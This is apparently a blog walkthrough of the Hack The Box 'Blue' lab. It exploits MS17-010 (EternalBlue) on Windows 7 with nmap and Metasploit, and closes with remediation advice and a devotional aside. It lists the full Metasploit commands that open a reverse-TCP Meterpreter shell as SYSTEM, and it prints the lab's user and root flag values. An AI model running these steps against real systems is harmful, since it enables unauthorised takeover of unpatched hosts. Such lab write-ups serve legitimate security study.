# Blue

Target: Blue (Hack The Box) OS: Windows Difficulty: Easy Attack Vectors: SMB Vulnerability (MS17–010) -> Remote Code Execution -> System…

***

### ⚔️ **The Breach in the Wall: Exploiting MS17–010 on HTB Blue** 🧱

**Target:** _Blue (Hack The Box)_ **OS:** _Windows_ **Difficulty:** _Easy_ **Attack Vectors:** _SMB Vulnerability (MS17–010) -> Remote Code Execution -> System Privilege._

![](https://cdn-images-1.medium.com/max/800/1*qGA22LB8Zc5YllloGYD6hg.png)

Image created by Nicholas Mullenski (Gemini)

> [**Not a Member Click Here to Read Full-Story!!**](https://medium.com/technology-hits/%EF%B8%8F-the-breach-in-the-wall-exploiting-ms17-010-on-htb-blue-259c9cb66da0?sk=3512bd0c7fe83f90663871b70d1fb299)

#### ⚠️ **Disclaimer:** This article is for educational and security auditing purposes only. All demonstrations were performed on the “Blue” machine within the Hack The Box lab environment. Never attempt to access or modify systems without explicit written permission from the owner.

### Executive Summary

This assessment targeted “Blue,” a Windows 7 Professional machine vulnerable to a critical flaw in the SMBv1 protocol. The initial foothold was achieved by identifying that the target was missing critical security patches, specifically MS17–010 (EternalBlue). By leveraging this buffer overflow vulnerability in the Microsoft Server Message Block (SMB) service, we bypassed authentication and executed arbitrary code. Unlike typical assessments requiring privilege escalation, the EternalBlue exploit immediately granted `NT AUTHORITY\SYSTEM` access, allowing for full compromise of the host without further lateral movement or local escalation steps.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan

The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target `10.10.10.40`.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Blue]
└─$ nmap -sC -sV -vvv -p- 10.10.10.40
<SNIP>
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
...
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-30T10:28:43-04:00
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|       servers (ms17-010).
```

### 1.1.2 Nmap Scan Analysis

The scan identified the core Windows networking ports (135, 139, 445) were open. The operating system was fingerprinted as **Windows 7 Professional 7601 Service Pack 1**. Most critically, the Nmap scripting engine (`--script smb-vuln-ms17-010`) flagged the host as **VULNERABLE** to MS17-010. This confirms that the machine is running a legacy version of SMBv1 that is susceptible to the "EternalBlue" exploit.

#### 1.2 Key Findings

* **Port 445 (SMB):** Windows 7 Professional SP1.
* **Vulnerability:** CVE-2017–0143 (MS17–010 / EternalBlue).
* **Risk:** Critical (Remote Code Execution as System).

### 1.3 Vulnerability Assessment

#### 1.3.1 Technology Identification

The target utilizes the Microsoft Server Message Block (SMB) protocol for file sharing. The specific version detected (Windows 7 SP1) is known to handle specially crafted packets incorrectly, allowing an attacker to overwrite memory and execute shellcode.

#### 1.3.2 Vulnerability Identification (MS17–010)

We confirmed the vulnerability using Metasploit’s auxiliary scanner to double-check the Nmap results before attempting exploitation.

**Command:**

```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.10.40
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1
```

### 2.0 Initial Shell

#### 2.1 Payload Delivery

#### 2.1.1 Exploit Configuration

To leverage CVE-2017–0143, we selected the `exploit/windows/smb/ms17_010_eternalblue` module in Metasploit. We configured the payload to establish a reverse TCP connection back to our attacking machine (`tun0` interface).

**Command:**

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
```

#### 2.1.2 Execution

We executed the exploit. The module sent the staged shellcode to the target via Port 445, overwriting the kernel memory to inject the payload.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.24:4444
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Target is vulnerable.
[*] 10.10.10.40:445 - Overwriting extended security...
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet...
[*] 10.10.10.40:445 - Receiving response from exploit packet...
[*] 10.10.10.40:445 - Sending double pulsed exploit...
[+] 10.10.10.40:445 - WIN!
[*] Meterpreter session 1 opened (10.10.14.24:4444 -> 10.10.10.40:49158)
```

#### 2.2 Execution & Verification

#### 2.2.1 Privilege Verification

The EternalBlue exploit operates at the kernel level, which typically results in the highest possible privileges immediately upon success. We verified our identity within the Meterpreter session.

**Command:**

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We confirmed we had full control over the machine.

#### 2.2.2 Flag Capture

With SYSTEM access, we bypassed all file permissions to retrieve the flags.

**User Flag:**

```
meterpreter > cat C:\\Users\\haris\\Desktop\\user.txt
1cf5e562d3d58e8c98a58bdaea26bd49
```

**Root Flag:**

```
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
a615e95e79124089915957525c2f6a37
```

![](https://cdn-images-1.medium.com/max/800/1*jzwhx-C2fdgB-ZJdP6BHFg.png)

Image created by Nicholas Mullenski (Gemini)

### 3.0 Spiritual Connection

**Verse:** _Isaiah 30:13_

> _“Therefore this iniquity shall be to you like a breach in a high wall, bulging out and about to collapse, whose breaking comes suddenly, in an instant.”_

**Connection:** The EternalBlue exploit targets a fundamental flaw in the SMB protocol — a core structural component of Windows networking. Just as the verse describes a “breach in a high wall” that bulges unnoticed, this vulnerability existed deep within the system’s foundation. When exploited, the collapse of the system’s security was not gradual; it was “sudden, in an instant,” granting immediate System-level control. This serves as a reminder that ignoring foundational weaknesses (patching) leads to sudden and total failure.

### 4.0 Red Team Mandate

**Conclusion:** The compromise of the “Blue” host demonstrates the catastrophic risk of running legacy operating systems with unpatched SMB services. The successful execution of MS17–010 allowed for complete system takeover in under 60 seconds, bypassing all authentication mechanisms. This vulnerability does not require user interaction (phishing) or credentials, making it a prime vector for automated ransomware worms (like WannaCry).

**Remediation:**

1. **Immediate Patching:** Apply Microsoft Security Bulletin MS17–010 immediately to all Windows systems.
2. **Disable SMBv1:** Disable the legacy SMBv1 protocol via Group Policy, as it is obsolete and insecure.
3. **Network Segmentation:** Isolate legacy systems that cannot be patched into restricted VLANs with strict firewall rules blocking Port 445 from the general network.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

**Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.**

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 2, 2026](https://medium.com/p/259c9cb66da0).

[Canonical link](https://medium.com/@nicholasmullenski/%EF%B8%8F-the-breach-in-the-wall-exploiting-ms17-010-on-htb-blue-259c9cb66da0)

Exported from [Medium](https://medium.com) on September 1, 2026.
